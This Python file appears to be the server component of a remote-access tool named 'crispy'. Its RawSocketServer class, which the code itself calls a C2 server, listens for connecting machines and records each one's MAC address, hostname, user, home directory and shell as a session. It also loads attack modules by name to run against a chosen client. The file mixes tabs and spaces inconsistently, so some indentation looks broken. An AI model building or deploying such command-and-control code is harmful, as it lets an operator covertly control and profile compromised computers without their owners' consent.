import crispy.modules
import json
import logging
import pkgutil
import socket
import threading

from .. lib.client import CrispyClient

logger = logging.getLogger(__name__)

class RawSocketServer(threading.Thread):
    """ Backend server methods for clients. """

    def __init__(self, host, port):
        self.clients = []
        self.current_id = 1
        self.host = host
        self.port = port
        self.srvsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.srvsocket.bind((host, port))
        self.srvsocket.listen(5)
        threading.Thread.__init__(self)

    def run(self):
        while True:
            conn, addr = self.srvsocket.accept()
            self.add_client(conn, addr, json.loads(conn.recv(1024)))

    def shutdown(self):
        self.remove_all()
        self.srvsocket.close()

    def add_client(self, conn, addr, l):
        """ Add new client to client list. """
	logger.debug("add_session() was called")
	cc = CrispyClient({"conn":conn, "id":self.current_id, "ip":addr[0], "macaddr":l[0], "hostname":l[1], "plat":l[2], "proc_type":l[3], "proc_arch":l[4], "uptime":l[5], "date":l[6], "user":l[7], "home":l[8], "shell":l[9]})
	logger.info("Session {} opened ({}:{} <- {}:{})".format(self.current_id, self.host, self.port, addr[0], addr[1]))
	self.clients.append(cc)
	self.current_id += 1

    def remove_all(self):
        """ Remove all clients from client list. """
        logger.debug("remove_all() was called")
        for client in self.clients:
            client.get_session().close()
            self.clients.remove(client)

    def remove_client(self, conn):
        """ Remove client from client list. """
	logger.debug("remove_client() was called")
	for client in self.clients:
	    if client.get_session() is conn:
                self.clients.remove(client)
	        self.current_id -= 1

    def remove_client_id(self, id): 
    	""" Remove client given an id from client list. """
	logger.debug("remove_client_id() was called")
	self.clients.remove(self.get_client(id))
	self.current_id -= 1

    def get_client_list(self):
        """ Return a list of clients connected to the C2 server. """
	logger.debug("get_client_list() was called")
        return self.clients

    def get_client(self, id):
	""" Return client given session id. """
	logger.debug("get_client() was called")
	for client in self.clients:
	    if client.get_id() == id:
		return client

    def get_modules(self):
	""" Iterate over all modules. """
	logger.debug("get_modules() was called")
	mods = []
	for module_loader, module_name, ispkg in pkgutil.iter_modules(crispy.modules.__path__):
	    mods.append(module_name)
	return sorted(mods)

    def get_module(self, name, target):
	""" Return a module by name. """
	logger.debug("get_module() was called")
	for module_loader, module_name, ispkg in pkgutil.iter_modules(crispy.modules.__path__):
	    if module_name == name:
		module = module_loader.find_module(module_name).load_module(module_name)
                class_name = None
		
		if hasattr(module, "__class_name__"):
		    class_name = module.__class_name__
		return getattr(module, class_name)(target)

    def module_parse_args(self, module, args):
	""" Verify validity of args passed to given module. """
	logger.debug("module_parse_args() was called")
	return module.check_args(args)
